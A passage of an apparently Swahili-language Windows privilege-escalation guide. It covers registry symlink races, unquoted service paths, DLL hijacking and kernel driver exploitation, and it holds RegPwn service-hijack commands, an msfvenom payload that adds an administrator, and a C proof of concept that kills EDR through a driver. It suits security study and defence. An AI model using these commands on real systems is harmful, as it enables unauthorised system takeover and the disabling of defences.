### Mashindano ya registry symlink ya kuandika thamani yoyote ya HKLM (ATConfig)

Baadhi ya vipengele vya Windows Accessibility huunda funguo za **ATConfig** kwa kila mtumiaji, ambazo baadaye hunakiliwa na mchakato wa **SYSTEM** kwenye ufunguo wa kipindi wa HKLM. Mashindano ya **symbolic link** ya registry yanaweza kuelekeza uandishi huo wenye upendeleo kwenye **njia yoyote ya HKLM**, na hivyo kutoa uwezo wa kuandika **thamani yoyote ya HKLM**.<sup>[[18]](#references)</sup>

Maeneo muhimu (mfano: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` huorodhesha vipengele vya accessibility vilivyosakinishwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` huhifadhi usanidi unaodhibitiwa na mtumiaji.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` huundwa wakati wa kuingia au mabadiliko ya secure-desktop na inaweza kuandikwa na mtumiaji.

Mtiririko wa matumizi mabaya (CVE-2026-24291 / ATConfig):

1. Weka thamani ya **HKCU ATConfig** unayotaka iandikwe na SYSTEM.
2. Anzisha kunakili kwa secure-desktop (kwa mfano, **LockWorkstation**), kunakoanzisha mtiririko wa AT broker.
3. **Shinda mashindano** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; oplock inapotokea, badilisha ufunguo wa **HKLM Session ATConfig** uwe **registry link** inayoelekeza kwenye lengo la HKLM lililolindwa.
4. SYSTEM huandika thamani iliyochaguliwa na mshambuliaji kwenye njia ya HKLM iliyoelekezwa.

Ukipata uwezo wa kuandika thamani yoyote ya HKLM, tumia hilo kupata LPE kwa kubadilisha thamani za usanidi wa huduma:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/mstari wa amri)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua huduma ambayo mtumiaji wa kawaida anaweza kuanzisha (kwa mfano, **`msiserver`**) kisha ianzishe baada ya kuandika thamani. **Kumbuka:** utekelezaji wa exploit wa umma **hufunga workstation** kama sehemu ya mashindano.

Zana za mfano (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

Ikiwa una ruhusa hii kwenye registry, inamaanisha **unaweza kuunda sub registries kutoka kwenye hii**. Kwa huduma za Windows, hii **inatosha kutekeleza code yoyote:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ikiwa path ya executable haijawekwa ndani ya alama za kunukuu, Windows itajaribu kutekeleza kila kipande cha path kinachoishia kabla ya nafasi.

Kwa mfano, kwa path _C:\Program Files\Some Folder\Service.exe_, Windows itajaribu kutekeleza:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Orodhesha njia zote za huduma zisizowekwa kwenye alama za kunukuu, ukiondoa zile za huduma zilizojengewa ndani ya Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Unaweza kugundua na kutumia exploit** hii kwa metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda mwenyewe binary ya service kwa kutumia metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Vitendo vya Urejeshaji

Windows huruhusu watumiaji kubainisha vitendo vya kutekelezwa huduma inaposhindwa. Kipengele hiki kinaweza kusanidiwa kuelekeza kwenye binary. Ikiwa binary hiyo inaweza kubadilishwa, huenda ikawezekana kupandisha marupurupu. Maelezo zaidi yanapatikana kwenye [nyaraka rasmi](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Faili lengwa za script za scheduled task

Kwa task iliyowezeshwa inayoendesha `cmd.exe /c` pamoja na faili ya `.bat` au `.cmd`, kagua script iliyotajwa kwenye **action arguments** na pia `cmd.exe`. Hali hiyo hiyo inatumika kwa hoja ya faili iliyobainishwa wazi ya interpreter, kama vile PowerShell `-File`. Ikiwa batch file ya scheduled task ina mwito halisi wa PowerShell `-File`, kagua ACL ya script inayorejelewa pia; variables, masharti na uunganishaji wa shell huhitaji kufuatiliwa mwenyewe. Script au directory ya mzazi inayoweza kuandikwa na mwitaji ni dalili ya uwezekano wa utekelezaji kati ya akaunti tu ikiwa principal iliyosanidiwa ya task ni tofauti na ya mwitaji, na task inafikia action hiyo kwa kweli. ACL inayoruhusu kuongeza tu inaweza kuwa muhimu kwa scripts, lakini `exit` ya awali au mtiririko mwingine wa udhibiti unaweza kufanya mistari iliyoongezwa isifikiwe. Thibitisha ACL zinazotumika, [muktadha wa utekelezaji wa task](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), directory ya kazi, trigger na sera ya udhibiti wa programu kabla ya kudai kuwa kuna upandishaji wa marupurupu. Orodha ya vitu haipaswi kubadilisha script au kuanzisha task.

## Mitiririko yenye majina kwenye faili zinazoweza kufikiwa

Kwenye NTFS, faili inayosomeka inaweza kuwa na mtiririko wa `:$DATA` wenye jina, ambao maudhui yake hayaonekani kwenye orodha ya kawaida ya directory. Kwa seti ndogo na husika ya faili za backup au usanidi zinazoweza kufikiwa, kagua **majina na ukubwa** wa mitiririko kabla ya kufungua maudhui yoyote; Windows hutoa ufikiaji kupitia [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), na PowerShell kupitia [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Jina la mtiririko linaloashiria siri ni dalili tu. Kagua ruhusa halisi ya kusoma faili, kama mfumo wa faili unaunga mkono mitiririko, kama mtiririko una credentials zinazoweza kutumika, na akaunti wanayoithibitisha kwa kweli. Epuka kuchanganua mitiririko kwa kujirudia na kuchapisha maudhui ya mitiririko wakati wa kuorodhesha vitu kwa kawaida.

## Ingizo saidizi za Windows Driver Kit zilizopangwa

Windows Driver Kit ya hiari inajumuisha `StandaloneRunner.exe`, ambayo inaweza kutumia faili za `command.txt`, `reboot.rsf` na project `working\rsf.rsf` kutoka kwenye directory yake ya uendeshaji. Scheduled task au service inayoanzisha helper hii kwa akaunti yenye marupurupu inaweza kutumia ufikiaji wa kuandika wa marupurupu ya chini kwenye ingizo hizo kutekeleza amri katika muktadha wa akaunti hiyo, hata kama executable ya helper yenyewe inalindwa. Thibitisha mtumiaji mwenye marupurupu anayeitumia na kwamba **faili zote mbili** za sidecar zinaweza kuundwa au kurekebishwa; kuipata helper pekee hakutoshi.

Kwa scheduled task, kagua [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) ya action yake na ACL za njia mbili za sidecar. Ikiwa task haibainishi directory ya kazi, directory ya executable ni dalili tu ya kuthibitisha, si uthibitisho wa mahali task inaposoma ingizo zake. Sharti la faili ya project ya kazi lazima pia litimizwe. Kagua principal halisi ya task badala ya kudhani inaendeshwa kama SYSTEM.

## Programu

### Programu Zilizosakinishwa

Kagua **ruhusa za binaries** (huenda ukaweza kubadilisha moja na kupandisha marupurupu) na za **folda** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Njia ya kurekebisha Checkmk Windows agent

[CVE-2024-0670](https://checkmk.com/werk/16361) inaathiri Checkmk Windows agents za zamani zilizokuwa zinaandika command files katika `C:\Windows\Temp` kisha kutekeleza faili iliyokuwepo awali na iliyolindwa dhidi ya kuandikwa upya pale jaribio la kuibadilisha liliposhindwa. Vendor alirekebisha tatizo katika 2.1.0p40, 2.2.0p23, 2.3.0b1, na 2.4.0b1. Kagua kiwango kamili cha patch kilichosakinishwa na kama operesheni husika ya agent inaweza kuendeshwa; lebo ya branch pekee, kama `2.1`, haiwezi kuthibitisha kama kuna uwezekano wa kuathirika. Enumeration inaweza kukagua version, hali ya service, na ruhusa za Temp bila kuunda files au kuanzisha agent commands.

#### Ukaguzi wa SAML service ya ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) iliathiri ADSelfService Plus build 6210 na za awali; vendor alirekebisha tatizo katika build 6211. Inahusika tu ikiwa SAML SSO **imewezeshwa sasa au iliwahi kuwezeshwa**. Kwa hiyo, rekodi ya bidhaa iliyosakinishwa au njia ya service ni kidokezo tu, si uthibitisho wa vulnerability: thibitisha build halisi, historia ya usanidi wa SAML, ufikikaji wa service kupitia mtandao, na akaunti inayoendesha service. Code execution kupitia service hurithi privileges za akaunti hiyo; utekelezaji kama SYSTEM unahitaji instance inayoendeshwa na SYSTEM. `OfflineBackup_*.ezip` inayosomeka katika saraka ya Backup ya bidhaa ni kidokezo tofauti cha backup iliyosimbwa kwa njia fiche, si ushahidi wa credential inayoweza kutumika au dosari hii ya SAML. Rekodi njia yake na ruhusa za ufikiaji bila kuifungua wakati wa enumeration ya kawaida.

#### Jenkins controller na mipaka ya akaunti za domain

Kwenye Windows Jenkins controller, tofautisha ruhusa ya kuunda au kusanidi job na ruhusa ya kuiendesha: [Jenkins inaeleza hizi kama ruhusa tofauti za `Job/Create`, `Job/Configure`, na `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ratiba iliyosanidiwa au remote trigger inaweza kutoa njia nyingine ya kuendesha build, lakini thibitisha kuwa imewezeshwa na build inaendeshwa kweli. Utekelezaji hutumia utambulisho wa controller au agent iliyochaguliwa, na credential iliyohifadhiwa inaweza kutumika tu ikiwa job inaweza kufikia scope yake. Kando na hilo, kagua ufikiaji wa metadata ya `JENKINS_HOME`: Jenkins huhifadhi credential material na encryption keys katika `credentials.xml`, `secrets/hudson.util.Secret`, na `secrets/master.key` ([hifadhi ya siri za Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Kuwepo kwao pekee hakufichui password; thibitisha **ruhusa ya kusoma files zinazohitajika** na njia tofauti ya kutumia tena akaunti bila kuchapisha siri kwenye matokeo yanayoshirikiwa. Ikiwa akaunti hiyo ina ruhusa ya kuandika `scriptPath` ya AD user object, thibitisha kuwa script path inaweza kuandikwa na kuna logon halisi au scheduled consumer inayoendeshwa kama mtumiaji lengwa kabla ya kuichukulia kama utekelezaji kati ya watumiaji. Udhibiti zaidi wa group unahitaji haki halisi za AD zilizothibitishwa kando.

#### Utambulisho wa Azure Pipelines self-hosted agent

Kwa Azure DevOps Server au mradi wa Azure Pipelines, tofautisha ruhusa ya **kuunda au kuhariri** pipeline na ruhusa ya **kuianzisha kwenye foleni** na kutumia agent pool iliyochaguliwa; [Microsoft inaeleza ruhusa za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) na [idhini ya pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) kando. Ikiwa akaunti yenye privileges za chini inaweza kutuma script step na kuendesha pipeline hiyo kwenye self-hosted Windows agent, step hiyo hutekelezwa kama [akaunti ya operating system iliyosanidiwa kwa agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Thibitisha pipeline halisi, vikwazo vya branch/resource, pool iliyoidhinishwa, job inayoweza kuendeshwa, na utambulisho wa agent service kabla ya kudai kuwa kuna mpito kati ya watumiaji au kwenda SYSTEM. Agent iliyosakinishwa, project role, au ruhusa ya kuandika repository ni vidokezo tu; kagua ruhusa na metadata ya local service bila kuanzisha build wakati wa passive enumeration.

#### Credentials za Microsoft Entra Connect Sync

[Microsoft inatofautisha](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **ADSync service account**, inayoendesha synchronization service na kufikia SQL database yake, na **AD DS connector account**, ambayo ruhusa zake za directory hutegemea vipengele vya sync vilivyosaniwa. Credentials za connector huhifadhiwa zikiwa zimesimbwa katika database hiyo, huku key material [ikilindwa na DPAPI chini ya ADSync service account](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sync service iliyosakinishwa, group ya local inayoonekana kuwa ya administrator, au uwezo wa kuona database pekee havithibitishi kuwa credential inaweza kufumbuliwa au kuna njia ya kupandisha privileges kwenye domain. Kagua kando ruhusa halisi za kusoma database, ufikiaji wa service account/key, mpangilio wa usakinishaji na SQL, utambulisho wa connector uliosanidiwa, na privileges halisi za AD za utambulisho huo. Enumeration ya kawaida inapaswa kuonyesha metadata ya service na ufikiaji tu, si kuuliza au kuchapisha siri zilizohifadhiwa.

#### Ruhusa za Printer driver support DLL

Printer driver iliyosakinishwa inaweza kuhifadhi support DLLs katika `C:\ProgramData` na kuzipakia kwenye print process yenye privileges za juu zaidi. Kagua saraka halisi ya driver na ACLs za DLL, pamoja na saraka za parent na reparse points, hata kama ruhusa ya kufanya printer WMI enumeration imekataliwa. Kwa [tatizo la Ricoh printer-driver CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), njia iliyoripotiwa ilikuwa `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [ufichuzi wa awali](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) unaeleza DLL kupakiwa na `PrintIsolationHost.exe`. ACL inayoruhusu kuandika ni kidokezo tu: thibitisha ruhusa halisi ya kuandika baada ya deny entries, kwamba driver husika imesakinishwa na inapakia faili chini ya utambulisho wenye privileges za juu, na kama driver iliyosasishwa au security program ya vendor imerekebisha usakinishaji huo. Usihitimishe kuwa kuna vulnerability kwa kuangalia jina la saraka au version ya driver pekee.

### Ruhusa za Kuandika

Angalia kama unaweza kurekebisha config file ili kusoma faili fulani maalum, au kama unaweza kurekebisha binary itakayoendeshwa na akaunti ya Administrator (schedtasks).

Njia mojawapo ya kutafuta ruhusa dhaifu za saraka/files kwenye mfumo ni kufanya:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ hupakia kiotomatiki DLL yoyote ya plugin iliyo chini ya folda zake za `plugins`. Ikiwa kuna usakinishaji wa portable/nakala unaoweza kuandikwa, kuweka plugin hasidi husababisha code execution kiotomatiki ndani ya `notepad++.exe` kila inapozinduliwa (ikiwemo kupitia `DllMain` na callbacks za plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Kuendesha wakati wa startup

**Angalia kama unaweza kubadilisha registry au binary ambayo itatekelezwa na mtumiaji mwingine.**\
**Soma** **ukurasa ufuatao** ili upate maelezo zaidi kuhusu **maeneo ya autoruns ya kuongeza privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Tafuta drivers zinazotiliwa shaka au zilizo hatarini za wahusika wengine.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ikiwa driver inafichua primitive ya kusoma/kuandika kernel katika anwani yoyote (jambo la kawaida katika IOCTL handler zilizoundwa vibaya), unaweza kupandisha ruhusa kwa kuiba token ya SYSTEM moja kwa moja kutoka kwenye kumbukumbu ya kernel.<sup>[[13]](#references)</sup> Tazama mbinu ya hatua kwa hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Nyenzo zinazohusiana na Windows kernel-exploitation:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Kwa hitilafu za race condition ambapo call iliyo hatarini hufungua njia ya Object Manager inayodhibitiwa na mshambuliaji, kupunguza kasi ya utafutaji kimakusudi (kwa kutumia vipengele vya njia vyenye urefu wa juu au minyororo ya directory ndefu) kunaweza kuongeza muda wa fursa kutoka microseconds hadi makumi ya microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF za cancel-safe queue, ufichuaji wa paged-pool, na I/O ring pivots

Baadhi ya minyororo ya Windows kernel LPE inaweza kujengwa kwa kutumia hitilafu mbili dhaifu kila moja kivyake: **race ya muda wa maisha wa cancel-safe queue** inayofuta request/CBD huku lock ya queue ikiwa bado imeshikiliwa, na ufichuaji wa **lock-release-before-copy** unaovuja allocation ya paged-pool iliyofutwa wakati wa `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Maelezo ya ukaguzi na exploitation:

- **Free-under-lock + cancel afterwards**: tafuta njia ya mafanikio inayofanya **Acquire -> CompleteRequest/free -> Release**, huku njia ya cancel ikifanya **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ikiwa njia ya mafanikio itafikia `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` kabla ya kuachilia lock ya CBDQ/CSQ, thread iliyozuiwa ndani ya `NtCancelIoFileEx -> IopCsqCancelRoutine` inaweza kuendelea baadaye na kupitisha `PFLT_CALLBACK_DATA` iliyofutwa kwenye callback ya remove ya driver.
- **Reclaim the freed queue object** kwa allocation ya paged-pool ya ukubwa sawa inayodhibitiwa na mshambuliaji. `NPFS` Data Queue Entries ni muhimu kwa sababu payload na ukubwa wake vinaweza kudhibitiwa, na unaweza kuvichunguza baadaye kwa kutumia pipe read/peek operations. Ikiwa object iliyofutwa ina list links, zibadilishe ziwe **cyclic list ya fake request nodes katika user memory** ili driver iendelee kuchakata request structures zilizofafanuliwa na mshambuliaji badala ya kusimama kwenye kichwa cha awali cha list.
- **Boresha write inayotabirika**: ikiwa fake request itaelekeza upya nested context pointer inayotumiwa na bookkeeping writes (timestamps / QPC / sehemu zilizo karibu na refcount), unaweza kupata **kernel write inayodhibiti anwani lakini si thamani**. Katika hali hiyo, lenga sehemu ya **length/size** ya sprayed pool object badala ya pointer ya mwisho ya code/data, kisha kagua spray hadi object iliyoharibiwa itoe **usomaji wa paged-pool nje ya mipaka**.
- **Muundo wa raceable disclosure**: syscall yoyote inayofanya `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ni mgombea mzuri. Uaminifu huongezeka mshambuliaji anapoweza kuongeza ukubwa wa buffer inayokopiwa (kwa mfano kwa kuongeza list/resource entries nyingi zinazoongeza ukubwa wa mwisho wa allocation ya serializer), kwa sababu copy ndefu zaidi huongeza muda wa replacement bila kusababisha mashine ku-crash.
- **Malengo ya refill yenye pointers nyingi**: Windows **I/O ring** registered-buffer arrays ni malengo bora ya disclosure kwa sababu ukubwa wake wa paged-pool unaweza kudhibitiwa na mshambuliaji (`8 * regBufferCnt`) na kila element ni kernel pointer inayoelekeza kwenye `_IOP_MC_BUFFER_ENTRY`. Leak moja ya arrays hizi, pata `IORING_OBJECT` iliyo karibu, kisha haribu **`RegBuffers`** na **`RegBuffersCount`** ili shughuli zinazofuata za I/O ring zitumie entries zilizoghushiwa na mshambuliaji na kutoa arbitrary kernel read/write. Ikiwa write pekee inayopatikana inakupa byte thabiti (kwa mfano kutoka `KUSER_SHARED_DATA+0x14`), tumia **overlapping unaligned writes** kujenga user pointer yenye byte inayojirudia kama `0x0101010101010101`, i-map kwa `VirtualAlloc`, kisha uweke registered-buffer array iliyoghushiwa hapo.<sup>[[30]](#references)</sup>

Viashiria muhimu vya debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Baada ya kupata arbitrary kernel read/write kutoka kwenye corrupted I/O ring, iba SYSTEM token kwa kutumia workflow ya kawaida ya post-primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives za memory corruption za Registry hive

Udhaifu wa kisasa wa hive hukuwezesha kupanga layouts zinazotabirika, kutumia descendants za HKLM/HKU zinazoweza kuandikwa, na kubadilisha metadata corruption kuwa kernel paged-pool overflows bila custom driver. Jifunze mnyororo mzima hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion kutoka kwenye paths zinazodhibitiwa na mshambuliaji

Baadhi ya drivers hukubali registry path kutoka userland, hukagua tu kwamba ni UTF-16 string halali, kisha huita `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` kwa kutumia `RTL_QUERY_REGISTRY_DIRECT` kuandika kwenye scalar ya stack kama `int readValue`. Ikiwa `RTL_QUERY_REGISTRY_TYPECHECK` haipo, `EntryContext` hutafsiriwa kulingana na aina **halisi** ya registry, si aina ambayo developer alitarajia.

Hii hutengeneza primitives mbili muhimu:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: path ya `\Registry\...` absolute inayodhibitiwa na mtumiaji huiruhusu driver kuuliza keys zilizochaguliwa na mshambuliaji, kufichua kuwepo kwake kupitia return codes/logs, na wakati mwingine kusoma values ambazo caller hangeweza kuzifikia moja kwa moja.
- **Kernel memory corruption**: destination ya scalar kama `&readValue` hutafsiriwa vibaya kama `REG_QWORD`, `UNICODE_STRING`, au buffer ya binary yenye ukubwa maalum, kutegemea aina ya registry value.

Vidokezo vya practical exploitation:

- **Windows 8+ mitigation**: ikiwa query inafikia **untrusted hive** kwa `RTL_QUERY_REGISTRY_DIRECT` lakini bila `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers hu-crash kwa `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Ili exploitability ibaki, tafuta **keys zinazoweza kuandikwa na mshambuliaji ndani ya trusted system hives** badala ya kuweka values chini ya `HKCU`.
- **Trusted-hive staging**: tumia NtObjectManager kuorodhesha descendants zinazoweza kuandikwa za `\Registry\Machine`, kisha endesha tena scan kwa token ya **low-integrity** iliyorudiwa ili kupata keys zinazoweza kufikiwa kutoka kwenye sandboxed contexts:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: uandishi wa moja kwa moja wa baiti 8 kwenye `int` ya baiti 4 huharibu data iliyo karibu kwenye stack na unaweza kufunika kwa sehemu pointer ya callback/function iliyo karibu.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode inatarajia `EntryContext` ionyeshe `UNICODE_STRING`. Ikiwa code itapakia kwanza `REG_DWORD` inayodhibitiwa na mshambulizi kwenye scalar ya stack kisha itumie tena buffer hiyo hiyo kusoma string, mshambulizi hudhibiti `Length`/`MaximumLength` na huathiri kwa kiasi pointer ya `Buffer`, na kusababisha uandishi wa kernel unaodhibitiwa kwa sehemu.
- **`REG_BINARY`**: kwa data kubwa ya binary, direct mode huchukulia `LONG` ya kwanza katika `EntryContext` kama ukubwa wa buffer wenye alama. Ikiwa usomaji wa awali wa `REG_DWORD` utaacha thamani hasi inayodhibitiwa na mshambulizi kwenye scalar iliyotumiwa tena, query inayofuata ya `REG_BINARY` hunakili baiti za mshambulizi moja kwa moja juu ya nafasi za stack zilizo karibu. Mara nyingi hii ndiyo njia rahisi zaidi ya kufunika kabisa pointer ya callback.

Muundo thabiti wa kutafuta: **usomaji wa registry wenye aina tofauti unaotumia variable ileile ya stack bila kuianzisha upya**. Tafuta `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, pointer za `EntryContext` zinazotumiwa tena, na njia za code ambapo usomaji wa kwanza wa registry huamua kama usomaji wa pili utafanyika.

#### Kutumia kutokuwepo kwa FILE_DEVICE_SECURE_OPEN kwenye device objects (LPE + EDR kill)

Baadhi ya drivers za third-party zilizotiwa saini huunda device object yao kwa SDDL imara kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN katika DeviceCharacteristics. Bila flag hii, DACL salama hailazimishwi device inapofunguliwa kupitia path iliyo na component ya ziada, hivyo mtumiaji yeyote asiye na ruhusa za juu anaweza kupata handle kwa kutumia path ya namespace kama:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (kutoka kwenye tukio halisi)

Mtumiaji akishaweza kufungua device, anaweza kutumia vibaya IOCTLs za privileged zinazotolewa na driver kwa LPE na tampering. Uwezo ulioonekana katika matukio halisi:
- Kurejesha handles zenye ruhusa kamili kwa processes zisizo na mipaka (wizi wa token / shell ya SYSTEM kupitia DuplicateTokenEx/CreateProcessAsUser).
- Kusoma/kuandika diski ghafi bila vizuizi (tampering ukiwa offline, mbinu za persistence wakati wa boot).
- Kusitisha processes zozote, ikiwemo Protected Process/Light (PP/PPL), na hivyo kuruhusu kuua AV/EDR kutoka user land kupitia kernel.

Muundo wa chini kabisa wa PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations kwa developers
- Weka FILE_DEVICE_SECURE_OPEN kila wakati unapounda device objects zinazokusudiwa kuzuiwa kwa DACL.
- Thibitisha muktadha wa caller kwa operations zenye privileges. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu kusitishwa kwa process au kurejeshwa kwa handles.
- Weka mipaka kwa IOCTLs (access masks, METHOD_*, uthibitishaji wa ingizo) na uzingatie miundo ya brokered badala ya privileges za kernel za moja kwa moja.

Mawazo ya ugunduzi kwa defenders
- Fuatilia ufunguzi wa device names zinazotia shaka kutoka user-mode (mf., \\ .\\amsdk*) na mfuatano mahususi wa IOCTL unaoashiria matumizi mabaya.
- Tekeleza Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) na udumishe allow/deny lists zako mwenyewe.


## PATH DLL Hijacking

Ikiwa una **ruhusa za kuandika ndani ya folda iliyo kwenye PATH** unaweza kuweza kuteka DLL inayopakiwa na process na **kuongeza privileges**.<sup>[[2]](#references)</sup>

Angalia ruhusa za folda zote zilizo ndani ya PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking kupitia `C:\node_modules`

Hii ni aina ya **Windows uncontrolled search path** inayoathiri programu za **Node.js** na **Electron** zinapotumia import isiyo na njia kamili kama `require("foo")`, huku module inayotarajiwa ikiwa **haipo**.<sup>[[20]](#references)</sup>

